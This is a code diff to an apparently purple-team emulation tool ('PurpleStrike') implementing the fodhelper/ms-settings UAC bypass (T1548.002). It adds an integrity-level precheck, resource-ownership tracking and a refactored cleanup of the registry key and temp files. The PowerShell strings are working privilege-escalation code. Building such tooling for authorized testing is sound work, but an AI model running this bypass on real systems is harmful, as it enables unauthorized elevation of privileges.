@@ -5,6 +5,7 @@ from typing import Any
 
 from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
 from purplestrike.techniques.connection import TargetConnection, command_error, get_connection
+from purplestrike.techniques.scripts import delete_temp_files
 
 logger = logging.getLogger(__name__)
 _created_targets: set[str] = set()
@@ -17,12 +18,24 @@ async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
         method = parameters.get("method", "fodhelper")
         conn = await get_connection(target)
         if method == "fodhelper":
+            identity = await conn.run_ps("whoami /groups")
+            if not identity.success:
+                raise RuntimeError(command_error(identity))
+            if "S-1-16-12288" in identity.stdout or "S-1-16-16384" in identity.stdout:
+                return TechniqueResult(
+                    technique_id="T1548.002",
+                    success=False,
+                    error=("The starting token is already high/system integrity. "
+                           "A medium-integrity session is required to validate a UAC transition."),
+                    execution_status=ExecutionStatus.SKIPPED,
+                )
             setup = await conn.run_ps(
                 "$ErrorActionPreference = 'Stop'; "
                 "$root = 'HKCU:\\Software\\Classes\\ms-settings'; "
                 "$key = Join-Path $root 'shell\\open\\command'; "
                 "if (Test-Path -LiteralPath $root) { "
                 "throw 'Existing ms-settings registration will not be overwritten' }; "
+                "Write-Output 'PurpleStrike-uac-resources-owned'; "
                 "$handler = Join-Path $env:TEMP 'purplestrike_uac_handler.vbs'; "
                 "$marker = Join-Path $env:TEMP 'purplestrike_uac_integrity.txt'; "
                 "[IO.File]::Delete($marker); "
@@ -42,12 +55,13 @@ async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
                 "-PropertyType String -Force | Out-Null; "
                 "$wscript = Join-Path $env:SystemRoot 'System32\\wscript.exe'; "
                 "$payload = '\"' + $wscript + '\" //B //NoLogo \"' + $handler + '\"'; "
-                "(Get-Item -LiteralPath $key).SetValue('', $payload, "
-                "[Microsoft.Win32.RegistryValueKind]::String); "
+                "Set-Item -LiteralPath $key -Value $payload -ErrorAction Stop; "
                 "$actual = (Get-Item -LiteralPath $key).GetValue(''); "
                 "if ($actual -ne $payload) { throw 'Default command verification failed' }; "
                 "Write-Output ('default-command=' + $actual)"
             )
+            if setup.success or "PurpleStrike-uac-resources-owned" in setup.stdout:
+                _created_targets.add(target)
             if not setup.success:
                 return TechniqueResult(
                     technique_id="T1548.002",
@@ -56,7 +70,6 @@ async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
                     error=command_error(setup)[:1024],
                     execution_status=ExecutionStatus.FAILURE,
                 )
-            _created_targets.add(target)
             trigger = await conn.run_ps(
                 "$ErrorActionPreference = 'Stop'; "
                 "$marker = Join-Path $env:TEMP 'purplestrike_uac_integrity.txt'; "
@@ -123,9 +136,7 @@ async def cleanup(target: str) -> None:
         result = await conn.run_ps(
             "Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' "
             "-Recurse -Force -ErrorAction SilentlyContinue; "
-            "Remove-Item -LiteralPath (Join-Path $env:TEMP "
-            "'purplestrike_uac_integrity.txt'), (Join-Path $env:TEMP "
-            "'purplestrike_uac_handler.vbs') -Force -ErrorAction SilentlyContinue"
+            + delete_temp_files("purplestrike_uac_integrity.txt", "purplestrike_uac_handler.vbs")
         )
         if not result.success:
             raise RuntimeError(command_error(result))
